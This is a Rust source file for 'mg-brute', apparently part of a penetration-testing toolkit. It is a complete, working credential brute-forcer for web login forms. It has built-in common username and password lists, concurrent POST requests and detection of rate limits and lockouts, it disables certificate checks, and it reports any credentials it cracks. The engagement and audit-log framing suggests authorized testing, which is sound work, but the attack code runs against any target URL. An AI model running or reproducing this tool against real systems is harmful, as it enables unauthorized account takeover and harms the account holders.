/*******************************************************************
 * Filename:        main.rs
 * Author:          Jeff
 * Date:            2026-05-17
 * Description:     mg-brute — login endpoint credential brute force with
 *                  rate-limit and lockout detection.
 * Notes:           Bounded concurrency via tokio::JoinSet; drained at ceiling.
 *                  Built-in credential lists are used when no list files given.
 *                  Found credentials are printed immediately as they are found.
 *******************************************************************/

use std::fs;
use std::path::Path;
use std::time::Duration;

use anyhow::{Context, Result};
use clap::Parser;
use serde::Serialize;
use time::OffsetDateTime;
use time::format_description::well_known::Rfc3339;
use tokio::task::JoinSet;

use engagement::Engagement;

// ── Constants ────────────────────────────────────────────────────────────────

const OUTPUT_SUBDIR: &str = "brute";
const OUTPUT_FILE_PREFIX: &str = "results-";
const AUDIT_TOOL: &str = "mg-brute";

const DEFAULT_FIELD_USER: &str = "username";
const DEFAULT_FIELD_PASS: &str = "password";

// Lockout pause in seconds when a rate-limit response is detected
const RATE_LIMIT_PAUSE_SECS: u64 = 5;

// Built-in username list (used when no --username and no --username-list)
const BUILTIN_USERNAMES: &[&str] = &[
    "admin",
    "administrator",
    "root",
    "user",
    "test",
];

// Built-in password list (used when no --password-list)
const BUILTIN_PASSWORDS: &[&str] = &[
    "password",
    "123456",
    "password1",
    "admin",
    "letmein",
    "welcome",
    "monkey",
    "dragon",
    "master",
    "123456789",
    "qwerty",
    "abc123",
    "Password1",
    "iloveyou",
    "1q2w3e4r",
    "sunshine",
    "princess",
    "football",
    "shadow",
    "superman",
];

// Response body keywords that indicate failure
const FAILURE_KEYWORDS: &[&str] = &[
    "invalid",
    "incorrect",
    "failed",
    "wrong",
    "error",
];

// Response body keywords that indicate success
const SUCCESS_KEYWORDS: &[&str] = &[
    "welcome",
    "dashboard",
    "logout",
    "profile",
];

// Body keywords that indicate rate limiting
const RATE_LIMIT_KEYWORDS: &[&str] = &["too many"];

// Body keywords that indicate account lockout
const LOCKOUT_KEYWORDS: &[&str] = &["locked", "suspended", "account disabled"];

// ── CLI ──────────────────────────────────────────────────────────────────────

#[derive(Parser, Debug)]
#[command(
    name = "mg-brute",
    about = "Login endpoint brute force with rate-limit and lockout detection"
)]
struct Args {
    /// Engagement name
    engagement: String,

    /// Engagements root directory
    #[arg(long, env = "MG_ENGAGEMENTS_DIR", default_value = "engagements")]
    engagements_dir: String,

    /// Login form URL to target
    #[arg(long)]
    target_url: String,

    /// Single username to test (combined with built-in or provided password list)
    #[arg(long)]
    username: Option<String>,

    /// Path to a newline-delimited username list file
    #[arg(long)]
    username_list: Option<String>,

    /// Path to a newline-delimited password list file
    #[arg(long)]
    password_list: Option<String>,

    /// Form field name for username
    #[arg(long, default_value = DEFAULT_FIELD_USER)]
    field_user: String,

    /// Form field name for password
    #[arg(long, default_value = DEFAULT_FIELD_PASS)]
    field_pass: String,

    /// Maximum concurrent requests
    #[arg(long, default_value_t = 3)]
    concurrency: usize,

    /// Milliseconds to pause between each attempt
    #[arg(long, default_value_t = 500)]
    delay_ms: u64,

    /// HTTP timeout in seconds
    #[arg(long, default_value_t = 15)]
    timeout: u64,

    /// Stop testing this username immediately when an account lockout is detected
    #[arg(long)]
    stop_on_lockout: bool,
}

// ── Data types ───────────────────────────────────────────────────────────────

// Outcome of a single credential attempt
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
enum AttemptOutcome {
    Success,
    Failure,
    RateLimit,
    Lockout,
    Error,
}

// Result of one credential attempt
#[derive(Debug, Clone, Serialize)]
struct AttemptResult {
    username: String,
    password: String,
    status: u16,
    outcome: AttemptOutcome,
    detail: String,
}

// Top-level output written to disk
#[derive(Serialize)]
struct BruteResults {
    engagement: String,
    timestamp: String,
    target_url: String,
    total_attempts: usize,
    found: Vec<FoundCredential>,
    results: Vec<AttemptResult>,
}

// Credential pair that produced a success response
#[derive(Debug, Clone, Serialize)]
struct FoundCredential {
    username: String,
    password: String,
}

// ── Helpers ───────────────────────────────────────────────────────────────────

// Load a newline-delimited word list from a file, skipping empty lines and comments
fn load_word_list(path: &str) -> Result<Vec<String>> {
    let raw = fs::read_to_string(path)
        .with_context(|| format!("read word list {path}"))?;
    Ok(raw
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .map(|l| l.to_string())
        .collect())
}

// Classify a response into an outcome based on status code and body content
fn classify_response(status: u16, body: &str) -> AttemptOutcome {
    let lower = body.to_lowercase();
    // Rate limit takes priority — server is asking us to back off
    if status == 429 || RATE_LIMIT_KEYWORDS.iter().any(|kw| lower.contains(kw)) {
        return AttemptOutcome::RateLimit;
    }
    // Lockout indicators
    if status == 403 || LOCKOUT_KEYWORDS.iter().any(|kw| lower.contains(kw)) {
        return AttemptOutcome::Lockout;
    }
    // Success: 302 redirect, OR no failure keywords AND at least one success keyword
    if status == 302 {
        return AttemptOutcome::Success;
    }
    let has_failure = FAILURE_KEYWORDS.iter().any(|kw| lower.contains(kw));
    let has_success = SUCCESS_KEYWORDS.iter().any(|kw| lower.contains(kw));
    if !has_failure && has_success {
        return AttemptOutcome::Success;
    }
    AttemptOutcome::Failure
}

// Attempt one credential pair against the target URL
async fn attempt(
    client: reqwest::Client,
    target_url: String,
    username: String,
    password: String,
    field_user: String,
    field_pass: String,
) -> AttemptResult {
    let params = [
        (field_user.as_str(), username.as_str()),
        (field_pass.as_str(), password.as_str()),
    ];
    match client.post(&target_url).form(&params).send().await {
        Ok(resp) => {
            let status = resp.status().as_u16();
            let body = resp.text().await.unwrap_or_default();
            let outcome = classify_response(status, &body);
            let detail = body.chars().take(256).collect();
            AttemptResult { username, password, status, outcome, detail }
        }
        Err(e) => AttemptResult {
            username,
            password,
            status: 0,
            outcome: AttemptOutcome::Error,
            detail: e.to_string(),
        },
    }
}

// ── Entry point ───────────────────────────────────────────────────────────────

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();

    let eng = Engagement::load_named(Path::new(&args.engagements_dir), &args.engagement)
        .with_context(|| format!("load engagement {}", args.engagement))?;

    // Build username list from CLI options
    let usernames: Vec<String> = if let Some(ref single) = args.username {
        vec![single.clone()]
    } else if let Some(ref path) = args.username_list {
        load_word_list(path)?
    } else {
        BUILTIN_USERNAMES.iter().map(|s| s.to_string()).collect()
    };

    // Build password list from CLI options
    let passwords: Vec<String> = if let Some(ref path) = args.password_list {
        load_word_list(path)?
    } else {
        BUILTIN_PASSWORDS.iter().map(|s| s.to_string()).collect()
    };

    eprintln!(
        "mg-brute: {} usernames × {} passwords = {} attempts → {}",
        usernames.len(),
        passwords.len(),
        usernames.len() * passwords.len(),
        args.target_url
    );

    // Build reqwest client with no-redirect policy (form POSTs may 302 on success)
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(args.timeout))
        .redirect(reqwest::redirect::Policy::none())
        .danger_accept_invalid_certs(true)
        .build()
        .context("build HTTP client")?;

    let delay = Duration::from_millis(args.delay_ms);
    let mut all_results: Vec<AttemptResult> = Vec::new();
    let mut found: Vec<FoundCredential> = Vec::new();
    let mut join_set: JoinSet<AttemptResult> = JoinSet::new();

    'outer: for username in &usernames {
        for password in &passwords {
            // Drain JoinSet when at concurrency ceiling
            if join_set.len() >= args.concurrency
                && let Some(Ok(r)) = join_set.join_next().await
            {
                handle_result(&r, &mut found, &args);
                all_results.push(r);
            }

            join_set.spawn(attempt(
                client.clone(),
                args.target_url.clone(),
                username.clone(),
                password.clone(),
                args.field_user.clone(),
                args.field_pass.clone(),
            ));

            tokio::time::sleep(delay).await;
        }

        // Drain all remaining tasks for this username before moving to next
        while let Some(Ok(r)) = join_set.join_next().await {
            let stop = r.outcome == AttemptOutcome::Lockout && args.stop_on_lockout;
            handle_result(&r, &mut found, &args);
            all_results.push(r);
            if stop {
                eprintln!("  [!] Lockout detected — stopping per --stop-on-lockout");
                break 'outer;
            }
        }
    }

    // Drain any remaining concurrent tasks
    while let Some(Ok(r)) = join_set.join_next().await {
        handle_result(&r, &mut found, &args);
        all_results.push(r);
    }

    println!("\n=== Brute Force Complete ===");
    println!("Found credentials: {}", found.len());
    for fc in &found {
        println!("  [FOUND] {}:{}", fc.username, fc.password);
    }

    // Write results JSON
    let out_dir = eng.root.join(OUTPUT_SUBDIR);
    fs::create_dir_all(&out_dir).context("create brute output dir")?;
    let ts = OffsetDateTime::now_utc().format(&Rfc3339)?;
    let ts_file = ts.replace(':', "-").replace('+', "Z");
    let out_path = out_dir.join(format!("{OUTPUT_FILE_PREFIX}{ts_file}.json"));

    let total = all_results.len();
    let results = BruteResults {
        engagement: args.engagement.clone(),
        timestamp: ts,
        target_url: args.target_url.clone(),
        total_attempts: total,
        found: found.clone(),
        results: all_results,
    };
    let json = serde_json::to_string_pretty(&results)?;
    fs::write(&out_path, &json).context("write results JSON")?;
    println!("[*] Results written to {}", out_path.display());

    // Audit log
    let detail = format!(
        "target={} attempts={} found={}",
        args.target_url,
        total,
        found.len()
    );
    let _ = eng.audit(AUDIT_TOOL, &eng.meta.target, Some(&detail));

    Ok(())
}

// Print findings immediately and record found credentials
fn handle_result(r: &AttemptResult, found: &mut Vec<FoundCredential>, args: &Args) {
    match r.outcome {
        AttemptOutcome::Success => {
            println!("[FOUND] {}:{} (status={})", r.username, r.password, r.status);
            found.push(FoundCredential {
                username: r.username.clone(),
                password: r.password.clone(),
            });
        }
        AttemptOutcome::RateLimit => {
            eprintln!(
                "  [!] Rate limit detected (status={}) — pausing {}s",
                r.status, RATE_LIMIT_PAUSE_SECS
            );
            // Blocking sleep here is intentional: we're in the serial drain loop
            std::thread::sleep(Duration::from_secs(RATE_LIMIT_PAUSE_SECS));
        }
        AttemptOutcome::Lockout => {
            eprintln!(
                "  [!] Lockout detected for {} (status={})",
                r.username, r.status
            );
            if args.stop_on_lockout {
                // Caller checks the flag; message already printed
            }
        }
        _ => {}
    }
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn classify_success_on_302() {
        assert_eq!(classify_response(302, ""), AttemptOutcome::Success);
    }

    #[test]
    fn classify_success_on_welcome_body_without_failure_keywords() {
        assert_eq!(
            classify_response(200, "Welcome to the dashboard"),
            AttemptOutcome::Success
        );
    }

    #[test]
    fn classify_failure_on_invalid_keyword() {
        assert_eq!(
            classify_response(200, "Invalid username or password"),
            AttemptOutcome::Failure
        );
    }

    #[test]
    fn classify_rate_limit_on_429() {
        assert_eq!(classify_response(429, ""), AttemptOutcome::RateLimit);
    }

    #[test]
    fn classify_rate_limit_on_body_keyword() {
        assert_eq!(
            classify_response(200, "Too many login attempts"),
            AttemptOutcome::RateLimit
        );
    }

    #[test]
    fn classify_lockout_on_403() {
        assert_eq!(classify_response(403, ""), AttemptOutcome::Lockout);
    }

    #[test]
    fn classify_lockout_on_body_keyword() {
        assert_eq!(
            classify_response(200, "Your account is locked"),
            AttemptOutcome::Lockout
        );
    }

    #[test]
    fn builtin_usernames_count() {
        assert_eq!(BUILTIN_USERNAMES.len(), 5);
    }

    #[test]
    fn builtin_passwords_count() {
        assert_eq!(BUILTIN_PASSWORDS.len(), 20);
    }

    #[test]
    fn load_word_list_reads_lines_and_skips_comments() {
        let tmp = tempfile::NamedTempFile::new().unwrap();
        fs::write(tmp.path(), "admin\n# comment\nroot\n\nuser\n").unwrap();
        let list = load_word_list(tmp.path().to_str().unwrap()).unwrap();
        assert_eq!(list, vec!["admin", "root", "user"]);
    }
}
